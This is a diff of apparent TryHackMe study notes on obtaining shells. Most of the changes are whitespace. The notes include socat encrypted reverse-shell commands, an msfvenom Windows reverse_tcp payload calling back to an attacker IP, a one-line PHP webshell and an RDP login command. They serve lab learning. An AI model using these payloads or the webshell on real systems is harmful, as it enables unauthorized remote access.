@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-28-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-28
-
 # What the Shell?
 
 ## Socat Encrypted Shells
@@ -21,18 +16,21 @@ Socat can also make encrypted connections, which foil after-the-fact network ana
 # Generate a self-signed certificate.
 #
 openssl req -newkey rsa:2048 \
--nodes \
--keyout shell.key \
--x509 \
--days 362 \
--out shell.crt
+            -nodes \
+            -keyout shell.key \
+            -x509 \
+            -days 362 \
+            -out shell.crt
+
 # Create a PEM file combining the certificate and key.
 #
 cat shell.key shell.crt > shell.pem
+
 # Start a listener.
 #
 socat \
 OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -
+
 # Start the reverse shell on the target.
 #
 socat \
@@ -54,6 +52,7 @@ Auto-stabilized shell using encryption (UNIX-like targets only):
 socat \
 OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 \
 FILE:`tty`,raw,echo=0
+
 # Target: Connect the listener on the attacker to an
 # interactive login bash shell.
 #
@@ -107,8 +106,8 @@ Fortunately (unfortunately?) msfvenom will automate our reverse shell needs. It 
 
 ```
 msfvenom -p windows/x64/shell/reverse_tcp \
--f exe -o shell.exe \
-LHOST=$ATTACKER_IP LPORT=$LISTENER_PORT
+         -f exe -o shell.exe \
+         LHOST=$ATTACKER_IP LPORT=$LISTENER_PORT
 ```
 
 The payload (`-p`) switch takes a Metasploit payload name. Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads). Staged payloads replace the first `_` with a `/`, so windows/x64/shell/reverse\_tcp is a staged while windows/x64/shell\_revers\_tcp is stageless.
@@ -127,7 +126,7 @@ Webshells are shells that run within a webserver, typically receiving input via 
 
 ```
 <?php
-echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
+	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
 ?>
 ```
 
@@ -217,11 +216,11 @@ It seems that xfreerdp is installed on Kali Linux, so we can connect from there.
 
 ```
 xfreerdp /dynamic-resolution \
-+clipboard \
-/cert:ignore \
-/v:$TARGET_IP \
-/u:$USER \
-/p:$PASSWORD
+         +clipboard \
+         /cert:ignore \
+         /v:$TARGET_IP \
+         /u:$USER \
+         /p:$PASSWORD
 ```
 
 > Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
